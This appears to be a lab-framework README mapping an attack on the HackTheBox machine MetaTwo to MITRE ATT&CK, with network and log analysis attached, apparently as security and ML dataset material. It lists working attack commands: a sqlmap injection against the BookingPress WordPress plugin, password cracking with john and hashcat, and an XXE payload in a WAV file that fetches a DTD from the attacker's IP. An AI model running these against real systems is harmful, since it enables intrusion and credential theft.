# Cyber4ML_Framework application in "MetaTwo" HTB machine

## Framework application details

|Documentation|MITRE ATT&CK|Network Analysis|Log Analysis|
|-|-|-|-|
|Yes|Yes|Yes|Yes|

|Attacker Level|Environment|VPN|Attacker IP|Victim IP|
|-|-|-|-|-|
|Average|Linux|Yes|10.10.16.17|10.10.11.186|

**Average:** The knowledge, behavior and attack-timing of the attacker is average.

## Documentation

Documentation of the attack: [MetaTwo Documentation](https://github.com/stevendamianakis/HackTheBox_Writeups/blob/main/Machines/MetaTwo/README.MD)

## MITRE ATT&CK mapping

Below, we map the attack to the MITRE ATT&CK Enterprise framework.

| Tactic | Technique | Subtechnique | Command/Script | CVE/CWE |
| - | - | - | - | - |
| Initial Access | Exploit Public-Facing Application | - | (1) | CVE-2022-0739/CWE-89 |
| Execution | Command and Scripting Interpreter | Unix Shell | (1) | CVE-2022-0739/CWE-89 |
| Credential Access | Brute Force | Password Cracking | (2), (3) | - |
| Initial Access | Valid Accounts | Local Accounts | - | - |
| Reconnaissance | Active Scanning | Vulnerability Scanning | (4) | - |
| Initial Access | Exploit Public-Facing Application | - | (5) | CVE-2021-29447/CWE-611 |
| Execution | Exploitation for Client Execution | - | (5) | CVE-2021-29447/CWE-611 |
| Persistence | Valid Accounts | Local Accounts | (6) | - |
| Credential Access | Credentials from Password Stores | Password Managers | - | - |
| Privilege Escalation | Valid Accounts | Local Accounts | - | - |

#### Commands/Scripts
- (1)
```
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data="action=bookingpress_front_get_category_services&_wpnonce=35b4fc273d&category_id=33&total_service=1" -p "total_service" --dbs
```
- (2)
```
john hashes --wordlist=rockyou.txt
``` 

- (3)
```
john -w=rockyou.txt gpg.john
```

- (4)
```
wpscan --url http://metapress.htb
```

- (5)
```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.16.17:4444/xxe_attack.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

- (6)
```
ssh jnelson@metapress.htb
```

#### Alternative Commands/Scripts
- (2)
```
hashcat -m 400 -a 0 hashes rockyou.txt
```


## Network Analysis

Pcap file of the attack: [Capture File](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/MetaTwo/attack_capture.pcapng)

## Log Analysis

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 21 Mar 2023 01:47:40 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```
```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 30 Mar 2023 01:25:57 GMT
Content-Type: text/plain; charset=UTF-8
Connection: close
X-Powered-By: PHP/8.0.24
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-WP-Upload-Attachment-ID: 29
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Content-Length: 1066

{"success":true,"data":{"id":29,"title":"payload","filename":"payload-1.wav","url":"http:\/\/metapress.htb\/wp-content\/uploads\/2023\/03\/payload-1.wav","link":"http:\/\/metapress.htb\/payload-2\/","alt":"","author":"2","description":"\"payload\".","caption":"","name":"payload-2","status":"inherit","uploadedTo":0,"date":1680139557000,"modified":1680139557000,"menuOrder":0,"mime":"audio\/wav","type":"audio","subtype":"wav","icon":"http:\/\/metapress.htb\/wp-includes\/images\/media\/audio.png","dateFormatted":"March 30, 2023","nonces":{"update":false,"delete":false,"edit":false},"editLink":false,"meta":{"artist":false,"album":false,"bitrate":false,"bitrate_mode":"cbr"},"authorName":"manager","authorLink":"http:\/\/metapress.htb\/wp-admin\/profile.php","filesizeInBytes":145,"filesizeHumanReadable":"145 B","context":"","image":{"src":"http:\/\/metapress.htb\/wp-includes\/images\/media\/audio.png","width":48,"height":64},"thumb":{"src":"http:\/\/metapress.htb\/wp-includes\/images\/media\/audio.png","width":48,"height":64},"compat":{"item":"","meta":""}}}
```
